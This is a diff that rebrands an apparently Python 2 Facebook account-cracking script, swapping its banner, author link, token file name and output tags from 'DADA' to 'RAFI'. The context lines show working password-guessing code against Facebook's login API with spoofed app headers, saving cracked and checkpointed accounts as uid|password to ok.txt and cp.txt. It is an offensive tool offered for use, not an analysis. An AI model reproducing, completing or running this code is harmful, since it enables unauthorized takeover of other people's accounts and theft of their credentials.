@@ -71,7 +71,16 @@ def linex():
 
 
 def logo():
-    os.system('echo "\n______________________________\n___  __ \\__    |__  __ \\__    |\n__  / / /_  /| |_  / / /_  /| |\n_  /_/ /_  ___ |  /_/ /_  ___ |\n/_____/ /_/  |_/_____/ /_/  |_|\n                                                   \n--------------------------------------------\nAuthor  : ABDULLAH (MR DADA)\nGithub  : AbdullahDada420\nFb ID   : https://facebook.com/D4D4HERE\n--------------------------------------------\n[THE UNB34T4BL3 XHOKR4 MR D4D4]\n--------------------------------------------" | lolcat -a -d 2 -s 50')
+    os.system('echo "\
+ #     # ######      ######     #    #######   
+ ##   ## #     #     #     #   # #   #       # 
+ # # # # #     #     #     #  #   #  #       # 
+ #  #  # ######      ######  #     # #####   # 
+ #     # #   #   ### #   #   ####### #       # 
+ #     # #    #  ### #    #  #     # #       # 
+ #     # #     # ### #     # #     # #       # 
+                                               
+                                                  \n--------------------------------------------\nAuthor  : ABDULLAH (MR DADA)\nGithub  : AbdullahDada420\nFb ID   : https://facebook.com/D4D4HERE\n--------------------------------------------\n[THE UNB34T4BL3 XHOKR4 MR D4D4]\n--------------------------------------------" | lolcat -a -d 2 -s 50')
 
 
 def main():
@@ -103,7 +112,7 @@ def log_sel():
         subprocess.check_output([
             'am',
             'start',
-            'https://facebook.com/D4D4HERE'])
+            'https://www.facebook.com/rafivaim.m.m'])
         main()
     elif sel == '0' or sel == '00':
         xox('\n\t\x1b[91;1m GOOD BYE SEE YOU AGAIN :)')
@@ -119,7 +128,7 @@ def token():
     os.system('clear')
     
     try:
-        token = open('vau_token.txt', 'r').read()
+        token = open('vai_token.txt', 'r').read()
         menu()
     except (KeyError, IOError):
         logo()
@@ -127,7 +136,7 @@ def token():
         print '\t\x1b[98;1m  LOGIN TOKEN'
         print ''
         token = raw_input('\x1b[98;1m PASTE TOKEN HERE: \x1b[92;1m')
-        sav = open('vau_token.txt', 'w')
+        sav = open('vai_token.txt', 'w')
         sav.write(token)
         sav.close()
         token_check()
@@ -138,7 +147,7 @@ def token():
 def token_check():
     
     try:
-        token = open('vau_token.txt', 'r').read()
+        token = open('vai_token.txt', 'r').read()
     except IOError:
         print '\x1b[91;1m[!] TOKEN INVALID'
         os.system('rm -rf vau_token.txt')
@@ -445,13 +454,13 @@ def crack_select1():
                         'x-fb-http-engine': 'Liger' }
                     data = requests.get(api, params = params, headers = headers_)
                     if 'access_token' in data.text and 'EAAA' in data.text:
-                        print ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;32m[RAFI-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('ok.txt', 'a')
                         ok.write(uid + '|' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in data.json()['error_msg']:
-                        print ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;37m[RAFI-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         cp = open('cp.txt', 'a')
                         cp.write(uid + '|' + pass3 + '\n')
                         cp.close()
@@ -480,13 +489,13 @@ def crack_select1():
                             'x-fb-http-engine': 'Liger' }
                         data = requests.get(api, params = params, headers = headers_)
                         if 'access_token' in data.text and 'EAAA' in data.text:
-                            print ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;32m[RAFI-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('ok.txt', 'a')
                             ok.write(uid + '|' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in data.json()['error_msg']:
-                            print ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;37m[RAFI-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             cp = open('cp.txt', 'a')
                             cp.write(uid + '|' + pass4 + '\n')
                             cp.close()
@@ -515,13 +524,13 @@ def crack_select1():
                                 'x-fb-http-engine': 'Liger' }
                             data = requests.get(api, params = params, headers = headers_)
                             if 'access_token' in data.text and 'EAAA' in data.text:
-                                print ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print ' \x1b[1;32m[RAFU-OK] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 ok = open('ok.txt', 'a')
                                 ok.write(uid + '|' + pass5 + '\n')
                                 ok.close()
                                 oks.append(uid + pass5)
                             elif 'www.facebook.com' in data.json()['error_msg']:
-                                print ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
+                                print ' \x1b[1;37m[RAFI-CP] ' + uid + ' | ' + pass5 + '\x1b[0;97m'
                                 cp = open('cp.txt', 'a')
                                 cp.write(uid + '|' + pass5 + '\n')
                                 cp.close()
@@ -550,13 +559,13 @@ def crack_select1():
                                     'x-fb-http-engine': 'Liger' }
                                 data = requests.get(api, params = params, headers = headers_)
                                 if 'access_token' in data.text and 'EAAA' in data.text:
-                                    print ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print ' \x1b[1;32m[RAFU-OK] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     ok = open('ok.txt', 'a')
                                     ok.write(uid + '|' + pass6 + '\n')
                                     ok.close()
                                     oks.append(uid + pass6)
                                 elif 'www.facebook.com' in data.json()['error_msg']:
-                                    print ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
+                                    print ' \x1b[1;37m[RAFI-CP] ' + uid + ' | ' + pass6 + '\x1b[0;97m'
                                     cp = open('cp.txt', 'a')
                                     cp.write(uid + '|' + pass6 + '\n')
                                     cp.close()
@@ -585,13 +594,13 @@ def crack_select1():
                                         'x-fb-http-engine': 'Liger' }
                                     data = requests.get(api, params = params, headers = headers_)
                                     if 'access_token' in data.text and 'EAAA' in data.text:
-                                        print ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print ' \x1b[1;32m[RAFI-OK] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         ok = open('ok.txt', 'a')
                                         ok.write(uid + '|' + pass7 + '\n')
                                         ok.close()
                                         oks.append(uid + pass7)
                                     elif 'www.facebook.com' in data.json()['error_msg']:
-                                        print ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
+                                        print ' \x1b[1;37m[RAFI-CP] ' + uid + ' | ' + pass7 + '\x1b[0;97m'
                                         cp = open('cp.txt', 'a')
                                         cp.write(uid + '|' + pass7 + '\n')
                                         cp.close()
@@ -620,13 +629,13 @@ def crack_select1():
                                             'x-fb-http-engine': 'Liger' }
                                         data = requests.get(api, params = params, headers = headers_)
                                         if 'access_token' in data.text and 'EAAA' in data.text:
-                                            print ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print ' \x1b[1;32m[RAFI-OK] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                             ok = open('ok.txt', 'a')
                                             ok.write(uid + '|' + pass8 + '\n')
                                             ok.close()
                                             oks.append(uid + pass8)
                                         elif 'www.facebook.com' in data.json()['error_msg']:
-                                            print ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
+                                            print ' \x1b[1;37m[RAFI-CP] ' + uid + ' | ' + pass8 + '\x1b[0;97m'
                                             cp = open('cp.txt', 'a')
                                             cp.write(uid + '|' + pass8 + '\n')
                                             cp.close()
@@ -804,13 +813,13 @@ def crack_select():
                 'x-fb-http-engine': 'Liger' }
             data = requests.get(api, params = params, headers = headers_)
             if 'access_token' in data.text and 'EAAA' in data.text:
-                print ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;32m[RAFI-OK] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 ok = open('ok.txt', 'a')
                 ok.write(uid + '|' + pass1 + '\n')
                 ok.close()
                 oks.append(uid + pass1)
             elif 'www.facebook.com' in data.json()['error_msg']:
-                print ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
+                print ' \x1b[1;37m[RAFI-CP] ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                 cp = open('cp.txt', 'a')
                 cp.write(uid + '|' + pass1 + '\n')
                 cp.close()
@@ -839,13 +848,13 @@ def crack_select():
                     'x-fb-http-engine': 'Liger' }
                 data = requests.get(api, params = params, headers = headers_)
                 if 'access_token' in data.text and 'EAAA' in data.text:
-                    print ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;32m[RAFI-OK] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     ok = open('ok.txt', 'a')
                     ok.write(uid + '|' + pass2 + '\n')
                     ok.close()
                     oks.append(uid + pass2)
                 elif 'www.facebook.com' in data.json()['error_msg']:
-                    print ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
+                    print ' \x1b[1;37m[RAFI-CP] ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                     cp = open('cp.txt', 'a')
                     cp.write(uid + '|' + pass2 + '\n')
                     cp.close()
@@ -874,13 +883,13 @@ def crack_select():
                         'x-fb-http-engine': 'Liger' }
                     data = requests.get(api, params = params, headers = headers_)
                     if 'access_token' in data.text and 'EAAA' in data.text:
-                        print ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;32m[RAFI-OK] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         ok = open('ok.txt', 'a')
                         ok.write(uid + '|' + pass3 + '\n')
                         ok.close()
                         oks.append(uid + pass3)
                     elif 'www.facebook.com' in data.json()['error_msg']:
-                        print ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
+                        print ' \x1b[1;37m[RAFI-CP] ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                         cp = open('cp.txt', 'a')
                         cp.write(uid + '|' + pass3 + '\n')
                         cp.close()
@@ -909,13 +918,13 @@ def crack_select():
                             'x-fb-http-engine': 'Liger' }
                         data = requests.get(api, params = params, headers = headers_)
                         if 'access_token' in data.text and 'EAAA' in data.text:
-                            print ' \x1b[1;32m[DADA-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;32m[RAFI-OK] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             ok = open('ok.txt', 'a')
                             ok.write(uid + '|' + pass4 + '\n')
                             ok.close()
                             oks.append(uid + pass4)
                         elif 'www.facebook.com' in data.json()['error_msg']:
-                            print ' \x1b[1;37m[DADA-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
+                            print ' \x1b[1;37m[RAFI-CP] ' + uid + ' | ' + pass4 + '\x1b[0;97m'
                             cp = open('cp.txt', 'a')
                             cp.write(uid + '|' + pass4 + '\n')
                             cp.close()
